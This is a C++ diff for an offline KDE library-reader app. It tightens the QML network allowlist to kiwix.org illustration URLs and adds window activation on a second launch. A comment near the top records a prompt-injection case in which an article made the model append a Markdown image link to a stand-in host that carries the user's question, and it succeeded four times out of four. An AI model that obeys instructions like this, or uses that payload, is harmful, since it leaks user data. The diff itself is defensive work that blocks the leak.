@@ -16,6 +16,7 @@
 #include <KAboutData>
 #include <KCrash>
 #include <KDBusService>
+#include <KWindowSystem>
 #include <KIconTheme>
 #include <KLocalizedQmlContext>
 #include <KLocalizedString>
@@ -34,7 +35,8 @@
 
 namespace
 {
-// The QML engine's network access: catalog illustrations from kiwix.org, and nothing else. Any text a QML item renders
+// The QML engine's network access: catalog illustrations from kiwix.org (that address shape only, see
+// Catalog::isIllustrationUrl), and nothing else. Any text a QML item renders
 // as rich text or Markdown (a ZIM title, a snippet, a model's answer) could otherwise make the app fetch an image from
 // anywhere: an article told the model to end its answer with ![](http://host/?q=<the question>), and it did, 4 times out
 // of 4 (the review, 2026-10-19). The app is offline by design; this keeps it so whatever text is shown.
@@ -48,7 +50,7 @@ protected:
     {
         // data: URLs never leave the computer: installed libraries' icons come from the database that way (refusing them
         // too left every library without its icon)
-        if (op == GetOperation && (Catalog::isKiwixUrl(request.url()) || request.url().scheme() == QLatin1String("data")))
+        if (op == GetOperation && (Catalog::isIllustrationUrl(request.url()) || request.url().scheme() == QLatin1String("data")))
             return QNetworkAccessManager::createRequest(op, request, data);
         qWarning("Refused a network request from the interface: %s", qUtf8Printable(request.url().toDisplayString(QUrl::RemoveQuery)));
         return QNetworkAccessManager::createRequest(GetOperation, QNetworkRequest(QUrl(QStringLiteral("refused:"))), nullptr);
@@ -153,6 +155,15 @@ int main(int argc, char *argv[])
     engine.loadFromModule("KAthenaeum", "Main");
     if (engine.rootObjects().isEmpty())
         return 1;
+    // a second launch asks this one to come forward
+    if (auto *window = qobject_cast<QQuickWindow *>(engine.rootObjects().first())) {
+        QObject::connect(&service, &KDBusService::activateRequested, window, [window] {
+            KWindowSystem::updateStartupId(window);
+            KWindowSystem::activateWindow(window);
+            window->show();
+            window->raise();
+        });
+    }
 
     return app.exec();
 }
